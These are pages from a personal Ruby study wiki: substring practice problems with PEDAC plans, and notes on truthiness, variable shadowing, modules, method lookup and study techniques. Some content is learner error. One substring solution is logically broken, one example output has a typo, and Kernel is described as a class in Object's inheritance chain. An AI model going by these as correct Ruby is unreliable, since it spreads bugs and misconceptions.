# Practice Problems: Substrings Manipulation

## Example 1

```ruby
=begin

Given a non-empty string, check if it can be constructed by taking a substring
of it and appending multiple copies of the substring together. You may assume
the given string consists of lowercase English letters only.

# PEDAC

## Problem

Input: a string of two or more English letters, in sequence or not
Output: a Boolean, true if the given string was in sequence, false otherwise

Clarifying:

- String size cannot be odd
- Sequence is 2+ characters size

## Examples

Example 1:
  - Input: "abab"
  - Output: true
  Explanation: It's the substring "ab" twice

Example 2:
  - Input: "aba"
  - Output: false

## Data
Arrays

## Algorithm

. Init `string_size` to return value of string size
. Return if `string_size` is odd
. Init `is_pattern` to false

. Find Substring of `char_size` chars
  . Iterate over the string with `upto` called on 1, passing in
    `string_size / 2`
  . Init `substring_candidate` to the return value of the string sliced from 0
    to `char_size`
  . Find if it's repeated substring (see below)
  . Break early if `is_pattern` returns true

. Slice the given `string` in `char_size` chars and check if they are all the
  same and save the return value inside `is_pattern`
  . Init `substring_array` to new Array
  . Init `string_candidate` to value pointed by `string`
  . Init `iterator` to 1
  . Loop until `iterator` equals `string` size / `substring_size`
    . Slice `string_candidate` of `char_size` and save the return value in
      `substring_array`
  . Check that `string_array[0]` is equal to all value in `string_array`
    . Return true if true
  . Return false

. Return `is_pattern`

=end

def repeated_substring?(string, substring_size)
  substring_array = Array.new
  string_candidate = string
  iterator = 1

  until iterator == string.size / substring_size
    substring_array << string_candidate[0..substring_size]
    iterator += 1
  end

  substring_array.all?(substring_array[0])
end

def repeated_substring_pattern(string)
  string_size = string.size
  return false if string_size.odd?

  is_pattern = false

  1.upto(string_size / 2) do |char_size|
    is_pattern = repeated_substring?(string, char_size)
    break if is_pattern == true
  end

  is_pattern
end

p repeated_substring_pattern("abab") == true
p repeated_substring_pattern("aba") == false
p repeated_substring_pattern("aabaaba") == false
p repeated_substring_pattern("abaababaab") == true
p repeated_substring_pattern("abcabcabcabc") == true
```

**Time:** 36:17

### Alternative Solution

The solution above does not work with a string of the same characters sucah as
`'aaaaa'` because it returns false for string of odd size.

```ruby
=begin

Given a non-empty string, check if it can be constructed by taking a substring
of it and appending multiple copies of the substring together. You may assume
the given string consists of lowercase English letters only.

Example 1:

 - Input "abab"
 - Output: True
 - Explanation: It's the substring 'ab' twice.

Example 2:

 - Input: "aba"
 - Output: False

# PEDAC

## Problem

Given a string, find if it contains repeatable substring.

Input: non-empty string with repeatable substring or not
Output: true or false, depending if it has repeatable substrings or not

Clarification:

- Non empty
- Only English letter? (no)
- Spaces? (No)
- All same characters is always true
- Odd characters (except all same) always false

## Data

Arrays of strings

## Algorithm

.  From the string create an array of x characters substrings
  .  Init a local variable sliced_string to new Array object
  .  Init a local variable substring_size to Integer 2
  .  Loop form 2 to half string size
    .  SLICE_STRING passing in `x` characters
    .  Check if they are all the same

.  SLICE_STRING
  .  Slice from 0 to `x` chars
  .  Add `x` to 0
  .  Slice again until reaching string size

=end

def slice_on_n_characters(string, size)
  equal_substrings = []
  first_char_index = 0

  loop do
    equal_substrings << string.slice(first_char_index, size)
    first_char_index += size
    break if first_char_index >= string.size
  end

  equal_substrings
end

def repeated_substring_pattern(string)
  return true if string.chars.all?(string[0])
  return false if string.size.odd?

  sliced_string = []
  half_string_size = string.size / 2

  2.upto(half_string_size) do |substring_size|
    sliced_string = slice_on_n_characters(string, substring_size)

    return true if sliced_string.all?(sliced_string[0])
  end

  false
end

p repeated_substring_pattern('abab') == true
p repeated_substring_pattern('aba') == false
p repeated_substring_pattern('aabaaba') == false
p repeated_substring_pattern('abaababaab') == true
p repeated_substring_pattern('abcabcabcabc') == true
p repeated_substring_pattern('aaaaa') == true
```

**Time:** 31:52

## Example 2

```ruby
=begin

Write a method to find the longest common prefix string amongst an array of
strings.

If there is no common prefix, return an empty string "".

Example 1:

- Input: ["flower", "flow", "flight"]
- Output: "f1"

Example 2:

- Input: ["dog", "racecar", "car"]
- Output: ""

Explanation: there is no common prefix among the input strings.

Note:

All given inputs are in lowecase letters a-z.

# PEDAC

## Problem

Input: an array of strings (english lowercase letters)
Output: Common prefix between strings or empty string if none found

Clarify:

- Prefix therefore first letter matters
- Same string in array: return string itself
- Size matter (not that much)

## Examples

See above

## Data
Arrays

## Algorithm

. Return "" if first letters of each string is different
. Return first string if each string are the same

. CREATE SUBSTRING
  . Iterate from first char of first string of array until string size
    . Save the resulting substring in a local variable

. CHECK PREFIX
  . Check if resulting substring is same substring in each string of array
    . Continue if true
    . Return current substring - last character otherwise

=end
def same_prefix(array, substring, substring_size)
  substring_array = array.select do |str|
    str[0...substring_size] == substring
  end

  substring_array.size == array.size
end

def common_prefix(array)
  return array[0] if array.all?(array[0])

  substring = String.new

  0.upto(array[0].size) do |char|
    substring = array[0][0...char]

    if same_prefix(array, substring, char)
      next
    else
      return substring[0...-1]
    end
  end

  ''
end

p common_prefix(["flower", "flow", "flight"]) == "fl"
p common_prefix(["dog", "racecar", "car"]) == ""
p common_prefix(["interspecies", "interstellar", "interstate"]) == "inters"
p common_prefix(["throne", "dungeon"]) == ""
p common_prefix(["throne", "throne"]) == "throne"
```

**Time:** 23:13

## Example 3

```ruby
=begin

Given 2 strings, your job is to find out if there is a substring that appears
in both strings. You will return true if you find a substring that appears in
both strings, or false if you do not.

We only care about substrings that are longer than one letter long.

# PEDAC

## Problem

Find if two strings have common substring.

Input: Two strings
Output: true if common substring, false otherwise

Clarify:

- String of +1 chars size
- Empty string always return false
- Case is irrelevent

## Data

Arrays of string and substrings

## Algorithm

. Return false if one of the string is 1 or less character long
. Return true if both string are the same string (dowcase)

. Downcase both given string
. SUBSTRING_STRING_1
  . Iterate from 0 upto string size - 1, passign in start_char as a param
    . Iterate from start_char upto string size - start_char - 1
      . Slice string and save result to a local variable substring_1
. SUBSTRING_STRING_2
  . Do the same thing

. COMPARE
  . Add substring_2 to substring_1 and save to all_substring
  . Delete substring that appears more than one
  . Compare the result with all_substring and return

=end
def every_substring(candidate)
  str_size = candidate.size
  substring_list = Array.new

  0.upto(str_size - 1) do |start_char|
    (start_char + 1).upto(str_size - 1) do |end_char|
      substring_list << candidate[start_char..end_char]
    end
  end

  substring_list
end

def substring_test(str1, str2)
  return false if str1.size < 2 || str2.size < 2
  str1.downcase!
  str2.downcase!
  return true if str1 == str2

  substr1 = every_substring(str1).uniq
  substr2 = every_substring(str2).uniq

  all_substr = substr1 + substr2

  all_substr.uniq != all_substr
end

p substring_test('Something', 'Fun') == false
p substring_test('Something', 'Home') == true
p substring_test('Something', 'Fun') == false
p substring_test('Something', '') == false
p substring_test('', 'Something') == false
p substring_test('BANANA', 'banana') == true
p substring_test('test', 'lllt') == false
p substring_test('', '') == false
p substring_test('1234567', '541265') == true
p substring_test('supercalifragilisticexpialidocious', 'SoundOfItIsAtrociou') == true
```

**Time:** 23:21

## Example 4

```ruby
=begin

Find the length of the longest substring in the given string that is the same
in reverse.

As an example, if the input was "I like racecars that go fast", the substring
(racecar) length would be 7.

If the length of the input string is 0, return value must be 0.

Example
"a" -> 1
"aab" -> 2
"abcde" -> 1
"zzbaabcd" -> 4
"" -> 0

# PEDAC

## Problem

Find the longest palindrome.

Input: a string of length 0 or more
Output: the length of the longest palindrome

Clarify:

- Could return string size if string size <= 1
- could return string size if first char of string is the same as all the char
- Can the input be a sentence with spaces? (No)

## Data

Arrays of substring

## Algorithm

. SUBSTRING_LIST
  . Init palindrome_list to a new Array object
  . Iterate from 0 to string size, passing in `first_char` as a param
    . Iterate from `first_char` to string size passing in `last_char` as a param
      . CHECK_PALINDROME
        . Save to palindrome_list if current iteration is a palindrome
        . Discard otherwise
  . Return the size of the longest palindrome in palindrome_list

. CHECK_PALINDROME
  . Check if the string reversed is the same as the passed in string
  . Return true or false

=end

def palindrome?(candidate)
  candidate.reverse == candidate
end

def longest_palindrome(candidate)
  palindrome_list = Array.new
  string_size = candidate.size

  0.upto(string_size - 1) do |first_char|
    first_char.upto(string_size - 1) do |last_char|
      palindrome_cand = candidate[first_char..last_char]
      palindrome_list << palindrome_cand if palindrome?(palindrome_cand)
    end
  end

  palindrome_list.min { |a, b| b.length <=> a.length }.length
end

p longest_palindrome("a") == 1
p longest_palindrome("aa") == 2
p longest_palindrome("baa") == 2
p longest_palindrome("aab") == 2
p longest_palindrome("baabcd") == 4
p longest_palindrome("baablkj12345432133d") == 9
```

**Time:** 20:24

## Example 5

```ruby
=begin

PROBLEM:

Given a string, write a method `palindrome_substrings` which returns
all the substrings from a given string which are palindromes. Consider
palindrome words case sensitive.

Test cases:

palindrome_substrings("supercalifragilisticexpialidocious") == ["ili"]
palindrome_substrings("abcddcbA") == ["bcddcb", "cddc", "dd"]
palindrome_substrings("palindrome") == []
palindrome_substrings("") == []

# PEDAC

## Problem

Returns substrings from a given string if they are palindromes (case sensitive)

Input: a string a-z with different case
Output: array of substring which are case sensitive palindrome

Clarification:

- Only a-z strings? (Yes)
- Return empty array if none found
- Return empty array if empty string given
- Returned arrays' element are ordered in find order
- Palindrome is 2 chars or more? (Yes)

## Data

Arrays of strings

## Algorithm

. SUBSTRINGS
. Init pal_substr to a new Array object
  . Iterate over the string from 1 upto string size -1 passing in start_char as
    a parameter
    . Iterate over string from start_char + 1 upto string size - 1
      . Add string sliced with start/end_char to pal_substr if PALINDROME?
      . Continue otherwise
. Return pal_substr

. PALINDROME?
  . Return given string equal to given string reversed

=end

def palindrome?(candidate)
  candidate.reverse == candidate
end

def palindrome_substrings(str)
  pal_substr = Array.new

  0.upto(str.size - 1) do |start_char|
    (start_char + 1).upto(str.size - 1) do |end_char|
      candidate = str[start_char..end_char]
      pal_substr << candidate if palindrome?(candidate)
    end
  end

  pal_substr
end

p palindrome_substrings("supercalifragilisticexpialidocious") == ["ili"]
p palindrome_substrings("abcddcbA") == ["bcddcb", "cddc", "dd"]
p palindrome_substrings("palindrome") == []
p palindrome_substrings("") == []
```

**Time:** 16:26

## Example 6

```ruby
=begin

Write a method that will return a substring based on specified indices.

# PEDAC

## Problem

Find the substring based on the given indices (second and third parameters)

Input: a string
       an indice indicating the first character in the string
       an indice indicating the last character in the string
Output: substring from the string based on the two indices given

Clarification:

- String is zero indexed
- Return empty string if indices are bigger than the string? (No)
- Negative indice possible? (No)
- Default indice are nil and nil? (Yes)

## Data

String

## Algorithm

. Return empty string if no indice provided
. Init string_size to size of the given string
. Check if first indice is bigger than string_size
  . REDUCE it to a value between 0 and string_size if true
. Return the character at the first indice index if second indice is nil
. Check if second indice is bigger than string_size
  . REDUCE it to a value between 0 and string_size if true
. Return every string between first and second indice

. REDUCE
. Until value is smaller than string_size, substract string_size to given value
. Return new value

=end

def reduce_indice(big_indice, max_size)
  while big_indice > max_size
    big_indice -= max_size
  end

  big_indice
end

def substring(string, ind_start=nil, ind_end=nil)
  return '' if ind_start.nil?

  string_size = string.size

  ind_start = reduce_indice(ind_start, string_size) if ind_start >= string_size
  return string[ind_start] if ind_end.nil?

  ind_end = reduce_indice(ind_end, string_size) if ind_end > string_size

  string[ind_start..ind_end]
end

p substring("honey", 0, 2) == "hon"
p substring("honey", 1, 2) == "on"
p substring("honey", 3, 9) == "ey"
p substring("honey", 2)    == "n"
```

**Time:** 18:56

## Example 7

```ruby
=begin

Write a method that finds all substrings in a string, no 1 letter words.

# PEDAC

## Problem

Find every substrings of a string of more than 1 letter.

Input: a string
Output: an array of every substrings of 2+ letters

Clarification:

- Order matters
- Case matters
- Substrings is every group of 2 or more characters included in the given
  string

## Data

Arrays

## Algorithm

. Init a local variable results to empty Arrat
. Count from 0 up to string size - 2, passing in char_start as a parameter
  . Call SUBSTRING_MAKER passign in the string and char_start
  . Save the result to results
. Return results

. SUBSTRING_MAKER
. Init a local variable substrings to empty Arrat
. Count from char_start + 1 to string size, passing in char_end as a parameter
  . Save the result of string slicing at index char_start and char_end
. Return substrings

=end

def substring_maker(string, first_letter)
  substrings = []

  (first_letter + 1).upto(string.size - 1) do |last_letter|
    substrings << string[first_letter..last_letter]
  end

  substrings
end

def substrings(string)
  results = []

  0.upto(string.size - 2) do |char_start|
    results << substring_maker(string, char_start)
  end

  results.flatten
end

p substrings("band") == ['ba', 'ban', 'band', 'an', 'and', 'nd']
p substrings("world") == ['wo', 'wor', 'worl', 'world', 'or',
                          'orl', 'orld', 'rl', 'rld', 'ld']
p substrings("ppop") == ['pp', 'ppo', 'ppop', 'po', 'pop', 'op']
```

**Time:** 15:05


===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-truthiness.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-truthiness -->
<!-- Title: Practice Problems: Truthiness -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-truthiness]], [[software/ruby/learning-tracks/practice-problems-truthiness]], [[ruby/learning-tracks/practice-problems-truthiness]], [[learning-tracks/practice-problems-truthiness]], [[practice-problems-truthiness]] -->

---
date: 2020-12-28T16:47
---

# Practice Problems: Truthiness

## Example 1

```ruby
arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]

new_array = arr.select do |n|
  n + 1
end

p new_array
```

**Answer:**

On `line 6`, we are calling the method `p` passing in local variable `new_array`
to it as an argument. This method output and return the array object pointed by the
variable, namely `[2, 3, 4, 5, 6, 7, 8, 9, 10, 11]`.

One `line 1`, we are initializing the local variable `arr` to the array object
with element 1 to 10: `[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]`.

On `line 3`, we are intializing `new_array` with the result of the method
`select`.

On `line 3-5`, the method `select` is called on the local variable `arr` passing in the
`do..end` block as an argument.

The method `select` iterates over each element in the array and passes it to
the block as the parameter `n`.

On `line 4`, `1` is added to `n`. As it's the last line of the block, the result
is returned.

The method `select` considers if the returned value of the block evaluates to
`true` or not. If it is, the method add the value to a new array.

This problem demonstrates the concept of truthiness. In Ruby, everything except
`false` and `nil` evaluates to `true`. In the case above, the block never
returns `false` or `nil`, therefore each value returned by the block are
evaluated to `true` and therefore all returned to the new array created by
`select`. This new array is used as the array object used in the initialization
of `new_array`.

## Example 2

```ruby
arr = [1, 2, 3].any? do |num|
  "hi"
end

p arr
```

**Answer:**

This code outputs `true` and return `true`.

On `line 5` we are calling the method `p` passing in the  local variable `arr`.

The local variable `arr` is defined on `line 1`. It is defined with the return
value of the method call `any?` on object array `[1, 2, 3]` passing in a
`do..end` block.

The method `any?` return `true` when at least one block passed to it returns
`true`. Here, it return `true` because on `line 1-3`, the `do..end` block
return the local string `"hi"` which always evaluates to true.

This problem demonstrates how the method `any?` works, as well as truthiness in
Ruby.

**Time**: 07:53



===

<!-- Source: computing/software/ruby/learning-tracks/practice-problems-variable-shadowing.md -->
<!-- URL: /computing/software/ruby/learning-tracks/practice-problems-variable-shadowing -->
<!-- Title: Practice Problems: Variable Shadowing -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/practice-problems-variable-shadowing]], [[software/ruby/learning-tracks/practice-problems-variable-shadowing]], [[ruby/learning-tracks/practice-problems-variable-shadowing]], [[learning-tracks/practice-problems-variable-shadowing]], [[practice-problems-variable-shadowing]] -->

---
date: 2021-02-20T15:55
---

# Practice Problems: Variable Shadowing

## Example 1

```ruby
a = 4
b = 2

2.times do |a|
  a = 5
  puts a
end

puts a
puts b
```

**Answer:**

The code outputs `5` two times and returns `nil`, then outputs `4` and returns
`nil`, then outputs `2` and returns `nil`.

On `line 1` we are initializing local variable `a` to Integer object `4`.

On `line 2` we are initializing local variable `b` to Integer object `2`.

On `line 4-7` we are calling method `times` on Integer object `2` and passing
in a `do..end` as an argument to it. Afterwards, method `times` returns the
Integer object it was called upon.

The `do..end` block is executed two times, passing in `a` as a parameter.

On `line 5` we are reassigning the local variable `a` to Integer object `5`.

On `line 9` we are calling the method `puts` and passing in the local variable
`a` as an argument to it.

On `line 10` we are calling the method `puts` and passing in the local variable
`b` as an argument to it.

This code demonstrates the concept of variable shadowing.

**Time:** 08:28

## Example 2

```ruby
n = 10

1.times do |n|
  n = 11
end

puts n
```

**Answer:**

The code outputs `10` and returns `nil`.

On `line 1` we are initializing local variable `n` to an Integer object of
value `10`.

On `line 3-5` we are calling the method `times` on Integer object `1` and
passing in the `do..end` block as an argument. The `do..end` block is executed
as many times as the integer method `times` is called upon, passing in local
variable `n` as an argument to it.

On `line 4` we are reassigning the local variable `n` to Integer object `11`.

On `line 7` we are calling the method `puts`, passing in the local variable
`n`. This method outputs the value `n` points to (`10`) and returns `nil`.

This code demonstrates the concept of variable shadowing. As the variable
outside the block and inside have the same name, the variable outside the block
cannot be accessed from inside the block.

**Time:** 06:10

## Example 3

```ruby
animal = "dog"

loop do |animal|
  animal = "cat"
  break
end

puts animal
```

**Answer:**

The code outputs `"dog"` and returns `nil`.

On `line 1` we are initializing local variable `animal` to a String object of
value `"dog"`.

On `line 3-6` we are calling the `loop` method and passing in a `do..end` block
to it as a parameter. The `do..end` block is executed until the `break`
condition is met, passing in the parameter `animal` to it.

On `line 4` we are reassigning the local variable `animal` to `"cat"`.

On `line 5` we are breaking out of the loop with the `break` keyword.

On `line 8` we are calling the method `puts` passing in local variable `animal`
to it.

This code demonstrates the concept of variable shadowing. Here, the local
variable `animal` has the same name as the local variable `animal` passed in as
a paramter of `do..end` block, therefore the latter cannot access the variable
of the outer scope.

**Time:** 06:45


===

<!-- Source: computing/software/ruby/learning-tracks/recall-technique.md -->
<!-- URL: /computing/software/ruby/learning-tracks/recall-technique -->
<!-- Title: Recall Technique -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/recall-technique]], [[software/ruby/learning-tracks/recall-technique]], [[ruby/learning-tracks/recall-technique]], [[learning-tracks/recall-technique]], [[recall-technique]] -->

---
date: 2020-09-25T09:46
---

# Recall Technique

The recall technique consists of, after participating in a class or studying a
document, to try and recall as many things as possible from it.

Actively trying to recall a concept instead of glancing at notes is more
effective and helps fixing the concept in the long term memory.

I've learned the technique from Dr. Barbara Oakley at her [Learning How to
Learn course](https://www.coursera.org/learn/learning-how-to-learn/).

> An ability to recall—to generate the ideas from inside yourself—is one of the
> key indicators of good learning.
> <footer class="">—Barbara Oakley, PhD, PE, <cite><a href="https://www.math.toronto.edu/nhoell/10rules-of-studying.pdf">10 Rules of Good Studying (PDF)</a></cite>, 2014</footer>


## How to Use Recall

{.ui .info .message}
This Zettel was actually written using this technique.

1. Actively listen to the course and/or read the materiel you want to remember
2. You may take note at this stage (especially if the course is not recorded)
3. After the course, take a sheet of paper and a pencil and try to
   remember and write down the main ideas WITHOUT reviewing your notes.
4. Reread the document you just produced and see if you can add more
   information and try to connect together the differnt things you remembered.
5. When you feel you cannot add more thoughts, review your note materials and
   see which points you got right and which were not fully understood.
6. You know have a list of every point you didn't fully grasp! But don't
   neglect the point you remembered well; memory is all about repetition!
7. Try recalling the main ideas in different situation: when cooking or in a
   different room from where you originally learned it.



===

<!-- Source: computing/software/ruby/learning-tracks/study-guide-for-interview.md -->
<!-- URL: /computing/software/ruby/learning-tracks/study-guide-for-interview -->
<!-- Title: Study Guide for Interview -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/study-guide-for-interview]], [[software/ruby/learning-tracks/study-guide-for-interview]], [[ruby/learning-tracks/study-guide-for-interview]], [[learning-tracks/study-guide-for-interview]], [[study-guide-for-interview]] -->

---
date: 2021-02-24T09:12
---

# Study Guide for Interview

## RB109

### General Topics

- [[mutable-and-immutable-objects]]
- [[logical-operators]]
- [[ruby-comparable]]
- [[ruby-gets-chomp]]
- [[ruby-new-class]]

### String

- [[ruby-substrings]]
- [[ruby-string-casecmp]]
- [[ruby-string-gsub]]
- [[ruby-kernel-format]]
- [[ruby-string-delete-count]]
- [[ruby-string-center]]
- [[practice-problems-string-manipulation]]

### Collections: Array and Hash

- [[mutation-in-arrays]]
- [[inject-reduce-method]]
- [[ruby-array-any]]
- [[ruby-difference-sort-sort-by]]
- [[practice-problems-arrays-manipulation]]
- [[practice-problems-hashes-manipulation]]
- [[practice-problems-indexes-manipulation]]

### Loop

- [[while-until-for-loop]]

### Other

- [[ruby-case-one-liner]]
- [[ruby-ternary-operator]]
- [[practice-problems-others]]
- [[maths-shortcut-tricks-code]]

## RB129

### Specific Topics of Interest

- [[what-is-object-oriented-programming]]
- [[polymorphism]]
  - [[duck-typing]]
- [[classes-and-objects]]
  - [[attributes-vs-state]]
- [[collaborator-objects]]
- [[variable-scope-oop]]
- [[method-lookup-path]]
- [[modules]]


===

<!-- Source: computing/software/ruby/learning-tracks/study-guide-test.md -->
<!-- URL: /computing/software/ruby/learning-tracks/study-guide-test -->
<!-- Title: Study Guide for Test -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/study-guide-test]], [[software/ruby/learning-tracks/study-guide-test]], [[ruby/learning-tracks/study-guide-test]], [[learning-tracks/study-guide-test]], [[study-guide-test]] -->

---
date: 2020-09-15T23:20
---

# Study Guide for Test

## RB109

### Specific Topics of Interest

- [[local-variable-scope]]
- [[ruby-pass-by-reference-of-the-value]]
- [[working-collections]]
- [[variables-as-pointers]]
- [[puts-return]]
- [[false-nil-truthiness]]
- [[method-definition-method-invocation]]
- [[implicit-return-value]]

### Other Topics to Know

- [[ruby-syntactical-sugar-pitfalls]]
- [[variable-shadowing]]

### Precision of Language

- [[use-precise-vocabulary]]
- [[evaluate-block]] with precision

### Practices Exercices

- [[written-assessment]]

### Study Techniques

- [[recall-technique]]

## RB129

### Specific Topics of Interest

- [[what-is-object-oriented-programming]]
- [[classes-and-objects]]
- [[getter-setter-methods-ruby]]
- [[instance-methods-vs-class-methods]]
- [[what-is-self-ruby]]
- [[fake-operators-equality]]

## RB139

### Specific Topics of Interest

- [[closure]]
- [[ruby-proc-and-scope]]
- [[blocks-in-ruby]]
- [[ruby-symbol]]
- [[testing-with-ruby]]
- [[seat-approach]]

## LS171

### The Internet

- [[networking-foundations]]
- [[physical-network]]
- [[networking-models]]
  - [[transport-layer]]
  - [[internet-network-layer]]
- DNS

### TCP & UDP

- [[transmission-control-protocol]]
- [[user-datagram-protocol]]

### URLs, HTTP, Request/Response Cycle

- [[http-protocol]]
- [[stateful-web-app]]

### Security

- [[http-security]]


===

<!-- Source: computing/software/ruby/learning-tracks/use-precise-vocabulary.md -->
<!-- URL: /computing/software/ruby/learning-tracks/use-precise-vocabulary -->
<!-- Title: Use Precise Vocabulary -->
<!-- Wikilinks: [[computing/software/ruby/learning-tracks/use-precise-vocabulary]], [[software/ruby/learning-tracks/use-precise-vocabulary]], [[ruby/learning-tracks/use-precise-vocabulary]], [[learning-tracks/use-precise-vocabulary]], [[use-precise-vocabulary]] -->

---
date: 2021-01-11T16:07
---

# Use Precise Vocabulary

In software engineering, programmers deal with a lot of _abstraction_. This can
easily make concepts and talking point confusing. One thing programmer can and
should do is use precise vocabulary when explaining concepts.

## Use Programming Terms

{.ui .info .note}
I am writting the line number in the margin for clarity.

```ruby
1| a = 'bonjour'
2| b = a
3| a = 'au revoir'
```

On `line 1` we are **initializing** the local variable `a` to a string object
of value `bonjour` to it.

(We could also say we are **assigning** the string object with a value
`bonjour` to the local variable `a`. Local variable `a` is **referencing**
that string object.)

On `line 2` we are **initializing** the local variable `b` to a string object
that the local variable `a` is referencing. Both local variables are pointing
to the same object.

On `line 3` we are **reassigning** the local variable `a` to a different string
object of value `au revoir`. Now, local variable `a` is **referencing** to a
string object of value `au revoir` and local variable `b` is **referencing** to
a string object of value `bonjour`.

```ruby
 1| def looping(str)
 2|   i = 3
 3|   loop do
 4|     puts str
 5|     i -= 1
 6|     break if i == 0
 7|   end
 8| end
 9|
10| looping('bonjour')
```

This code **output** the string `bonjour` 3 times and **returns** `nil`. The
returned value comes from the last line of the method, here `break if i == 0`,
which returns `nil`.

On `line 1-8` we are **defining** the method `looping` which takes one
_parameter_.

On `line 2` we are **initializing** the local variable `i` to an integer object
of value `3`.

On `line 3` we are **calling** the method `loop` (of the `Kernel` module) and
**passing in** the `do..end` block as an argument.

On `line 4` we are **calling** the method `puts` and **passing in** the local
variable `str` as an argument.

On `line 5` we are **reassigning** local variable `i` to an integer object of
value `i - 1` (we are actually **reassigning** the local variable `i` to the
return value of method call `-` on local variable `i` with integer `1` passed
to it as an argument.

On `line 6` we are breaking out of the loop with the keyword `break` if the
value of the object that local variable `i` is referencing is equal to `0`.

On `line 10` we are **calling** the method `looping` and passing in the string
`bonjour` as an _argument_ to it.

## Vocabulary to remember

* Variables: we are…
  * Initializing
  * Assigning
  * Referencing/pointing
  * Reassigning
* Methods: we are…
  * Defining (with parameter(s))
  * Calling (with argument(s))
  * Passing in (a block)
* Blocks: they are...
  * Called
  * Executed
* Codes…
  * Output
  * Return
  * Mutate

Objects are _physical spaces in memory_. Local variables are **referencing**
them.


===

<!-- Source: computing/software/ruby/method-lookup-path.md -->
<!-- URL: /computing/software/ruby/method-lookup-path -->
<!-- Title: Method Lookup Path -->
<!-- Wikilinks: [[computing/software/ruby/method-lookup-path]], [[software/ruby/method-lookup-path]], [[ruby/method-lookup-path]], [[method-lookup-path]] -->

---
date: 2021-06-05T15:00
---

# Method Lookup Path

In order to know where to look for a method, Ruby uses a defined lookup
path. This lookup path is, in order:

1. Inside the class
2. Inside the _last_ included module (then the one before, etc)
3. In the superclass (if inheriting)
4. In the superclass' modules (if included, starting with the last)
5. In the `Object` class
6. In the `Kernel` class
7. In the `BasicObject` class

The method lookup path can be checked with the `ancestors` class method:

```ruby
module Moving
end

module Sleeping
end

module Swim
end

module Fly
end

class Animal
  include Moving
  include Sleeping
end

class Flamingo < Animal
  include Swim
  include Fly

  def speak
    puts 'Fancy cry!'
  end
end

my_flamingo = Flamingo.new
my_flamingo.speak # => Fancy cry!

puts Flamingo.ancestors
# => Flamingo
#    Fly
#    Swim
#    Animal
#    Sleeping
#    Moving
#    Object
#    Kernel
#    BasicObject
```

The important thing to note is the order in which we include modules is
important. Last module is looked at _first_. The same thing happens for
each superclass until reaching `BasicObject`.

{.ui .info .message}
Every class in Ruby inherits from the `Object` class, which itself inherits
from `Kernel`, which itself inherits form `BasicObject`.


===

<!-- Source: computing/software/ruby/method-with-block-at-invocation.md -->
<!-- URL: /computing/software/ruby/method-with-block-at-invocation -->
<!-- Title: Method with Block at Invocation -->
<!-- Wikilinks: [[computing/software/ruby/method-with-block-at-invocation]], [[software/ruby/method-with-block-at-invocation]], [[ruby/method-with-block-at-invocation]], [[method-with-block-at-invocation]] -->

---
date: 2020-09-25T08:40
---

# Method with Block at Invocation

Local variable passed to a method as an argument is pretty straightforward: we
pass the variable and it is either used or not inside the method.

Block at invocation is a bit different: every method can use a block as an
argument but in order to be executed, the method needs to be constructed with
`yield`.

```ruby
def some_method
  yield
  puts 'un mouton !'
end

some_method do
  puts 'Dessine-moi...'
end

# => Dessine-moi...
#    un mouton !
```



===

<!-- Source: computing/software/ruby/modules.md -->
<!-- URL: /computing/software/ruby/modules -->
<!-- Title: Modules -->
<!-- Wikilinks: [[computing/software/ruby/modules]], [[software/ruby/modules]], [[ruby/modules]], [[modules]] -->

---
date: 2021-06-05T15:24
---

# Modules

Modules is a way to achieve #[[polymorphism]] is Ruby. A module is a
collection of behaviors that can be _included_ in another class via
**mixins**.

Modules are usefull because Ruby is a **single inheritance** language: a
class can only inherits from one superclass. This limitation makes it
difficult to design accurately a problem. Modules let the programmer
_mix in_ behaviors to achieve what would be otherwise impossible with a
single inheritance. A class can sub-class from only one parent
(superclass) but it can mix in as many modules as it likes.

Module cannot be instantiated (no object can be created from a module).
They are only used for mixins and namespacing.

## Mixins

Mixins comes from "mixed in": a module is _mixed in_ (mixin) to a class
using the `include` method invocation.

As Ruby's class can only inherits from one superclass, one can use module
and mixins to group common behaviors to create a more flexible design.

```ruby
module Speakable
  def speak(sound)
    puts sound
  end
end

class Flamingo
  include Speakable
end

johnny = Flamingo.new
johnny.speak('Gwa gwa!') # => Gwa gwa!
```

{.ui .message .info}
By convention, Rubyist use the "-_able_" suffix on a verb to describes the
behavior that the module is modeling. This is however not enforced.

See [[method-lookup-path]]# for how Ruby lookup methods of module mixed in
to a class.

## Namespacing

Namespacing means grouping similar classes under a common module. Using
namespacing has two advantages:

1. Better organize and recognize related classes in our code
2. Reduce the likelihood of our custom classes to collide with classes of
   the same name in the codebase (specially true when using a lot of gems)

```ruby
module Mammal
  class Dog
  end

  class Cat
  end
end

olive = Mammal::Dog.new
felix = Mammal::Cat.new
```

Classes in a module are called using two colons: `::`.

## Container (for methods)

Using modules as a **container** for methods (called **module methods**)
let us define methods that quite don't match any class and/or module in our
codebase.

```ruby
module Speakable
  # Other methods

  def self.out_of_place_method(num)
    num**2
  end
end

result = Speakable.out_of_place_method(4) # Preferred way to call the method
result = Speakable::out_of_place_method(4)
```


===

<!-- Source: computing/software/ruby/part-of-code-block-or-not.md -->
<!-- URL: /computing/software/ruby/part-of-code-block-or-not -->
<!-- Title: Deciding Whether Part of a Code is a Block or Not -->
<!-- Wikilinks: [[computing/software/ruby/part-of-code-block-or-not]], [[software/ruby/part-of-code-block-or-not]], [[ruby/part-of-code-block-or-not]], [[part-of-code-block-or-not]] -->

---
date: 2020-09-20T15:20
---

# Deciding Whether Part of a Code is a Block or Not

In [[ruby]], variable scope is defined by a _block_ (see [[local-variable-scope]]).
A block is usually delimited by curly brace `{}` or `do/end` pair.

However this is not always the case:

**Code delimited by `{}` or `do/end` is considered a block if the delimiters
follows a method invocation.**

```ruby
arr = [9, 8, 7, 6]  # Array initialized to variable arr in the outer scope

arr.each do         # Block passed as an argument to the `Array#each` method
  b = 3             # Variable b initialized in the inner scope
end

puts b              # NameError (undefined local variable or method `b' for
                    # main:Object) because of scope rules
```

Blocks are a way to pass chunk of codes around in our program. This programming
technique is called [closure](https://en.wikipedia.org/wiki/Closure_(computer_programming)).

Blocks are alike [anonymous functions in
Java](https://hashnode.com/post/anonymous-functions-in-java-explained-cj1opkbj8000sml53bsq6r6cj).

